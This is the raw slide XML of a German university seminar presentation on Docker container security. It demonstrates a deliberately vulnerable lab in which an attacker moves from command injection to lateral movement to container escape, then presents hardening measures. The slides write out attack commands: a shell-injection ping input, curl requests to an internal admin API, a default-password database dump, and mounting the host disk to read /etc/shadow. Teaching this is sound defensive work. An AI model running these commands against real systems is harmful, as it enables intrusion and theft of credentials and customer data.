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Container Security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Angriffsketten und Härtungsmaßnahmen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Beispiel einer Testumgebung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12700">
            <a:solidFill>
              <a:srgbClr val="2126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Frank &amp; Sergej Gerlitz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DHBW Heilbronn  ·  Wirtschaftsinformatik  ·  Forschungsseminar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1188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Docker-Sicherheit?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Namespaces, Cgroups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Testumgebung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 &amp; Schwachstellen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Angriff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→ Lateral Movement → Escape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Härtung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57600" y="35661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Maßnahmen &amp; Vorher-Nachher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160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65760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Ausblick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Motivation: Der Tesla-Hack (2018)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12801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Kubernetes-Konsole ohne Passwort → AWS-Zugang → Kryptomining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 drosselten CPU &amp; versteckten Traffic hinter legitimer Domain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81635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743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Fehlkonfiguration, kein Zero-Day-Exploit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38328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45643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3832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≠ automatisch sicher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9651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0233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nur so stark wie die Konfiguration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Container-Isolation: Wie funktioniert das?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Virtuelle Maschine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1554480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1554480" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F428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Gast-OS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554480"/>
            <a:ext cx="1554480" cy="4572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057400"/>
            <a:ext cx="1554480" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F4287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Gast-OS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3291840" cy="3657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926080"/>
            <a:ext cx="329184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926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Host-OS + Hardware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554480"/>
            <a:ext cx="1554480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1554480"/>
            <a:ext cx="1554480" cy="4572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554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103120"/>
            <a:ext cx="3291840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103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2514600"/>
            <a:ext cx="329184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Host-OS (gemeinsamer Kernel)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3657600"/>
            <a:ext cx="54864" cy="8229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37033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Kernpunkt: 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teilen sich den Host-Kernel. Die Isolation basiert auf Namespaces &amp; Cgroups — Kernel-Features, keine Hardware-Grenzen. Fehlkonfiguration = kein Schutz.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Unsere Testumgebung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887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Angreifer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280160"/>
            <a:ext cx="36576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3280" y="1051560"/>
            <a:ext cx="219456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383280" y="1051560"/>
            <a:ext cx="2194560" cy="54864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2344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31920" y="11887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:5000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383280" y="2377440"/>
            <a:ext cx="219456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383280" y="2377440"/>
            <a:ext cx="2194560" cy="54864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5603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3192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root:root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400800" y="2377440"/>
            <a:ext cx="2194560" cy="9144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00800" y="2377440"/>
            <a:ext cx="2194560" cy="54864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56032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25146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API-Keys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4480560" y="1965960"/>
            <a:ext cx="0" cy="41148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1" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5577840" y="2834640"/>
            <a:ext cx="82296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dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="73152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Eingebaute Schwachstellen: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31520" y="3886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Command Injection im Ping-Feld (kein Input-Filtering)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Container läuft als root + --privileged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DB mit Standard-Passwort (root:root)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Webapp im selben Netzwerk wie DB &amp; Admin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ANGRIFF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Schritt 1: Command Injection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Normaler Ping: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6576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2 8.8.8.8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84048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-c 2 8.8.8.8; whoami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passiert?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768096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060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Python-Code (verwundbar):
</a:t>
            </a:r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subprocess.run(f"ping -c 2 {host}", shell=True)
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Das Semikolon (;) trennt Befehle in der Shell.
</a:t>
            </a:r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Der Angreifer kann BELIEBIGE Befehle anhängen!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20624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41148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LIVE-DEMO: Eingabe im Browser → Ergebnis: "root"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ANGRIFF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Schritt 2: Lateral Movement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Netzwerk erkunden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curl -s http://admin:8080/health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Admin-API abfragen → API-Keys auslesen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curl -s http://admin:8080/api/config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Datenbank mit Standard-Passwort angreifen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mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"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1A1A2E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11480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63040" y="3977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Kundendaten, Kreditkarten, API-Keys — alles offengelegt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ANGRIFF  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Schritt 3: Container Escape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Container läuft mit --privileged → Zugriff auf Host-Devices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Prüfen: Sind wir privilegiert?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fdisk -l 2&gt;/dev/null | head -5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Host-Dateisystem einbinden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mkdir -p /mnt/host &amp;&amp; mount /dev/sda1 /mnt/host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Host-Dateien lesen → GAME OVER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4114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cat /mnt/host/etc/shadow | head -3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solidFill>
            <a:srgbClr val="2D1117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15968"/>
            <a:ext cx="347472" cy="3474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3040" y="42519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Vollständiger Zugriff auf das Host-System — Passwörter, SSH-Keys, alle Daten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 vollständige Angriffskette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560320" cy="54864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Einstieg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Injection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Ping-Feld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057400"/>
            <a:ext cx="411480" cy="4114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1840" y="1280160"/>
            <a:ext cx="2560320" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DB6D2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55448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B6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Ausbreitung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47472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DB &amp; Admin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057400"/>
            <a:ext cx="411480" cy="41148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126480" y="1280160"/>
            <a:ext cx="2560320" cy="54864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554480"/>
            <a:ext cx="640080" cy="6400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09360" y="2286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Ausbruch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30936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Host-System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31520" y="3749040"/>
            <a:ext cx="7680960" cy="8229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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3749040"/>
            <a:ext cx="54864" cy="8229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3" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="37947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Erkenntnis: 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Einstieg (Command Injection) ist eine allgemeine Web-Schwachstelle. Lateral Movement und Container Escape sind container-spezifisch und entstehen ausschließlich durch Fehlkonfiguration.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Härtungsmaßnahmen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749040" cy="10515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Input-Validierung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Regex-Whitelist, kein shell=True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1732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Verhindert: Command Injection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3749040" cy="10515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423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2624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appuser im Dockerfile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417320" y="2898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Verhindert: Privilege Escalation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474720"/>
            <a:ext cx="3749040" cy="10515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57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--privileged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17320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cap_drop: ALL + no-new-privileges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41732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Verhindert: Container Escape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46320" y="1005840"/>
            <a:ext cx="3749040" cy="10515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1887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Netzwerk-Segmentierung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13898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 nur in Frontend-Netz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532120" y="1664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Verhindert: Lateral Movement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846320" y="2240280"/>
            <a:ext cx="3749040" cy="10515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24231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2331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Filesystem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532120" y="2624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read_only: true in Compose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532120" y="28986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Verhindert: Datei-Manipulation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846320" y="3474720"/>
            <a:ext cx="3749040" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B2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32120" y="3566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Starke Passwörter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5532120" y="38587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Defaults, Secrets nutzen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532120" y="4133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Verhindert: Credential Stuffing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Vorher vs. Nachher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Angriff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904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 (verwundbar)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1051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Nachher (gehärtet)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29260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Injection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whoami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508760"/>
            <a:ext cx="2468880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D111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6642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0624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09360" y="1508760"/>
            <a:ext cx="2468880" cy="64008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642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Ungültige Eingabe!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31520" y="2286000"/>
            <a:ext cx="29260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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="22860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DB-Zugriff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-h db ...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49040" y="2286000"/>
            <a:ext cx="2468880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D111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44144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0624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Kundendaten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sichtbar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309360" y="2286000"/>
            <a:ext cx="2468880" cy="64008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4414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6656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 nicht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31520" y="3063240"/>
            <a:ext cx="29260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Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="82296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admin:8080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749040" y="3063240"/>
            <a:ext cx="2468880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D111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32186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offengelegt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309360" y="3063240"/>
            <a:ext cx="2468880" cy="64008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18688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665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 nicht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731520" y="3840480"/>
            <a:ext cx="292608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24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="38404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Escape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mount /dev/sda1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3749040" y="3840480"/>
            <a:ext cx="2468880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D1117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3995928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20624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Host-Dateien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lesbar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309360" y="3840480"/>
            <a:ext cx="2468880" cy="64008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995928"/>
            <a:ext cx="274320" cy="27432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766560" y="3840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600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Fazit &amp;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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="237744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isolieren nicht automatisch — Konfiguration entscheidet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2926080"/>
            <a:ext cx="54864" cy="4572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1" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1645920" y="2926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Angriffsketten zeigen: Ein Fehler reicht für den Kompromiss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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3474720"/>
            <a:ext cx="54864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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1645920" y="3474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Härtung ist kein Hexenwerk — wenige Zeilen in der Compose-Datei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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="4023360"/>
            <a:ext cx="54864" cy="4572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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1645920" y="4023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Depth: Mehrere Schichten, nicht eine einzelne Maßnahme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Dank! Fragen?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Container Security</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Max Frank &amp; Sergej Gerlitz</dc:creator>
  <cp:lastModifiedBy>Max Frank &amp; Sergej Gerlitz</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-17T09:43:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-17T09:43:58Z</dcterms:modified>
</cp:coreProperties>
</file>